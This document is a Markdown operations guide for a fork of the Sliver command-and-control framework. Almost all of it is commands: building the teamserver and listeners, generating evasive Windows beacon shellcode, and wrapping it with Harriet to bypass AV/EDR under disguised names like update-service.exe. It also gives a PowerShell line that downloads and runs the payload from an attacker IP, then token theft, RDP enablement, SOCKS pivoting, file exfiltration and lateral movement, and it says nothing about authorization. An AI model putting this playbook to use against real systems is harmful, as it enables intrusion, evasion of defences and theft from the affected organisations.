# Sliver Enhanced Fork - Complete Opsec Deployment Guide

## Prerequisites

### On Your Build/Teamserver Box (Kali/Ubuntu)
```bash
# Go 1.21+ (required for Sliver build)
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# MinGW (for Harriet cross-compilation)
sudo apt install -y mingw-w64 osslsigncode python3-pycryptodome

# Harriet
git clone https://github.com/assume-breach/Home-Grown-Red-Team.git /opt/Home-Grown-Red-Team
cd /opt/Home-Grown-Red-Team/Harriet && bash setup.sh

# Clone your fork
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver
```

---

## Step 1: Build Sliver Server + Client

```bash
cd ~/sliver
make

# Outputs:
#   sliver-server   (teamserver binary)
#   sliver-client   (operator client)
```

If `make` fails on dependencies:
```bash
go mod download
make
```

---

## Step 2: Start the Teamserver

```bash
# First run generates certs + database
./sliver-server

# You'll see:
#   sliver >
```

### Create an Operator Config (for remote clients)
```
sliver > new-operator --name mgstate --lhost YOUR_TEAMSERVER_IP --lport 31337 --save /tmp/mgstate.cfg
```

Transfer `mgstate.cfg` to your operator machine, then connect:
```bash
./sliver-client import /tmp/mgstate.cfg
./sliver-client
```

---

## Step 3: Import Opsec C2 Profiles

```
sliver > c2profiles import ~/sliver/opsec-profiles/microsoft365-c2.json --name microsoft365
sliver > c2profiles import ~/sliver/opsec-profiles/cloudflare-cdn-c2.json --name cloudflare
sliver > c2profiles import ~/sliver/opsec-profiles/slack-api-c2.json --name slack

# Verify loaded:
sliver > c2profiles
```

---

## Step 4: Start Listeners

### mTLS (Primary - encrypted, reliable, internal networks)
```
sliver > mtls --lhost 0.0.0.0 --lport 8888
```

### HTTPS (Internet-facing - blends with web traffic)
```
sliver > https --lhost 0.0.0.0 --lport 443 --domain your-c2-domain.com
```

### DNS (Backup - stealthiest, slowest)
```
sliver > dns --domains c2.yourdomain.com --lport 53
```

**Recommended:** Use mTLS as primary + HTTPS as failover:
```
sliver > mtls -l 0.0.0.0 -p 8888
sliver > https -l 0.0.0.0 -p 443 -d cdn-assets.yourdomain.com
```

---

## Step 5: Generate Opsec-Hardened Implant

### Option A: Beacon (Recommended - async, stealthier)
```
sliver > generate beacon \
  --mtls YOUR_IP:8888 \
  --http https://cdn-assets.yourdomain.com \
  --os windows --arch amd64 \
  --format shellcode \
  --evasion \
  --c2profile cloudflare \
  --seconds 60 --jitter 30 \
  --limit-domainjoined \
  --reconnect 30 \
  --max-errors 10 \
  --strategy r \
  --save /tmp/beacon.bin
```

### Option B: Session (Interactive - for active exploitation)
```
sliver > generate \
  --mtls YOUR_IP:8888 \
  --os windows --arch amd64 \
  --format shellcode \
  --evasion \
  --c2profile microsoft365 \
  --limit-hostname TARGET-PC \
  --reconnect 15 \
  --max-errors 5 \
  --save /tmp/session.bin
```

### Opsec Flag Reference
| Flag | Purpose | Recommended Value |
|------|---------|-------------------|
| `--evasion` | Unhooks EDR userspace hooks | Always use |
| `--c2profile NAME` | HTTP traffic mimicry | `cloudflare` or `microsoft365` |
| `--seconds N --jitter N` | Beacon callback interval | `60 --jitter 30` (30-90s range) |
| `--limit-domainjoined` | Only run on domain machines | Use in corporate targets |
| `--limit-hostname X` | Only run on specific host | Use for targeted delivery |
| `--limit-datetime X` | Kill date (implant self-destructs) | `2026-04-01T00:00:00Z` |
| `--limit-fileexists X` | Sandbox check - needs file to exist | `C:\Windows\System32\svchost.exe` |
| `--strategy r` | Randomize C2 fallback order | Always `r` or `rd` |
| `--reconnect 30` | Seconds between reconnect attempts | 15-60 |
| `--max-errors 10` | Exit after N failed connections | 5-20 |

---

## Step 6: Wrap with Harriet (AV/EDR Bypass)

This takes your raw shellcode and wraps it in an AES-encrypted, signed EXE.

### DirectSyscalls (Best Evasion)
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method directsyscall \
  --format exe \
  --output /tmp/update-service.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### QueueUserAPC (Good Evasion, Different Technique)
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method queueapc \
  --format exe \
  --output /tmp/health-check.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### As DLL (For DLL sideloading)
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method directsyscall \
  --format dll \
  --output /tmp/version.dll \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### Methods Ranked (Best to Worst)
| Method | Technique | EDR Bypass |
|--------|-----------|------------|
| `directsyscall` | Direct syscall stubs, skips ntdll entirely | Best |
| `queueapc` | NtQueueApcThread + NtTestAlert | Great |
| `nativeapi` | NT Native API (NtAllocateVirtualMemory) | Good |
| `inject` | Remote process injection | Moderate |
| `aes` | In-process AES decrypt + execute | Basic |

---

## Step 7: Deploy to Target

### Delivery Options
```bash
# Host for download (Sliver has built-in staging)
sliver > websites add-content --website updates --web-path /patch.exe --content /tmp/update-service.exe

# Or use Python HTTP server
python3 -m http.server 80 --directory /tmp/

# On target (PowerShell):
# iwr http://YOUR_IP/update-service.exe -OutFile C:\Users\Public\update-service.exe
# Start-Process C:\Users\Public\update-service.exe
```

### Wait for Callback
```
# Beacons check in async:
sliver > beacons

# Sessions are immediate:
sliver > sessions

# Interact with a beacon:
sliver > use BEACON_ID

# Interact with a session:
sliver > use SESSION_ID
```

---

## Step 8: Post-Exploitation

### Recon
```
sliver (IMPLANT) > whoami
sliver (IMPLANT) > getuid
sliver (IMPLANT) > ps
sliver (IMPLANT) > ifconfig
sliver (IMPLANT) > netstat
sliver (IMPLANT) > getprivs
```

### Token Impersonation

**Steal token by PID (finds process owner automatically):**
```
sliver (IMPLANT) > ps                    # Find target process
sliver (IMPLANT) > steal-token 1234      # Steal its token
# Output: PID 1234 -> explorer.exe (owner: CORP\domainadmin)
#         Successfully stole token from PID 1234

sliver (IMPLANT) > whoami                # Verify: CORP\domainadmin
```

**Quick impersonate with credentials (Type 9 network logon):**
```
sliver (IMPLANT) > quick-impersonate -u administrator -p Password123! -d CORP
# Creates network logon token - access SMB, RDP, WinRM as that user

# With immediate command execution:
sliver (IMPLANT) > quick-impersonate -u administrator -p Password123! -d CORP \
  -e "net group \"Domain Admins\" /domain"
```

**Quick impersonate by PID:**
```
sliver (IMPLANT) > quick-impersonate -P 1234 -e "whoami /all"
```

**Revert when done:**
```
sliver (IMPLANT) > rev2self
```

### RDP Access

**Auto port-forward + launch RDP client:**
```
sliver (IMPLANT) > rdp
# Sets up 127.0.0.1:13389 -> target:3389 and launches mstsc/xfreerdp
```

**With credentials:**
```
sliver (IMPLANT) > rdp -u administrator -p Password123! -d CORP
```

**Enable RDP on target first (if disabled):**
```
sliver (IMPLANT) > rdp --enable -u admin -p pass
```

**Just the tunnel (manual connect):**
```
sliver (IMPLANT) > rdp --no-launch
# Then on your box: xfreerdp /v:127.0.0.1:13389 /u:admin /p:pass /cert:tofu
```

### SOCKS Proxy (Pivot Through Implant)

```
sliver (IMPLANT) > socks5 start -p 1080

# Now route ANY tool through the implant:
proxychains nmap -sT -p 445,3389,5985 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24 -u admin -p pass
proxychains evil-winrm -i 10.10.10.5 -u admin -p pass
proxychains xfreerdp /v:10.10.10.5 /u:admin /p:pass /cert:tofu

# Stop when done:
sliver (IMPLANT) > socks5 stop
```

### File Operations
```
sliver (IMPLANT) > download C:\\Users\\admin\\Documents\\passwords.xlsx
sliver (IMPLANT) > upload /tmp/tool.exe C:\\Users\\Public\\tool.exe
sliver (IMPLANT) > ls C:\\Users
sliver (IMPLANT) > cat C:\\Users\\admin\\Desktop\\notes.txt
```

### Execute Commands
```
sliver (IMPLANT) > shell                          # Interactive shell
sliver (IMPLANT) > execute -o cmd.exe /c whoami   # Single command
sliver (IMPLANT) > execute -o powershell.exe -c "Get-Process"
```

### Lateral Movement
```
# PsExec to another box (needs admin creds):
sliver (IMPLANT) > psexec -u admin -p pass -d CORP 10.10.10.5

# SSH pivot:
sliver (IMPLANT) > ssh -l root -p password 10.10.10.5
```

---

## Step 9: Cleanup

```
sliver (IMPLANT) > rev2self              # Drop stolen tokens
sliver (IMPLANT) > socks5 stop           # Stop SOCKS
sliver (IMPLANT) > kill                  # Kill the implant

# On teamserver:
sliver > jobs                            # List listeners
sliver > jobs -k JOB_ID                  # Kill a listener
```

---

## Quick Reference: Full Attack Flow

```
# 1. Build
make

# 2. Start server
./sliver-server

# 3. Import profiles
c2profiles import opsec-profiles/cloudflare-cdn-c2.json --name cloudflare

# 4. Start listeners
mtls -l 0.0.0.0 -p 8888
https -l 0.0.0.0 -p 443 -d cdn.yourdomain.com

# 5. Generate shellcode
generate beacon --mtls IP:8888 --http https://cdn.yourdomain.com \
  --os windows --arch amd64 --format shellcode --evasion \
  --c2profile cloudflare --seconds 60 --jitter 30 \
  --strategy r --save /tmp/sc.bin

# 6. Wrap with Harriet
harriet --shellcode /tmp/sc.bin --method directsyscall -o /tmp/payload.exe

# 7. Deliver and wait
beacons

# 8. Interact
use BEACON_ID
ps
steal-token 1234
rdp --enable -u admin -p pass
rev2self
kill
```
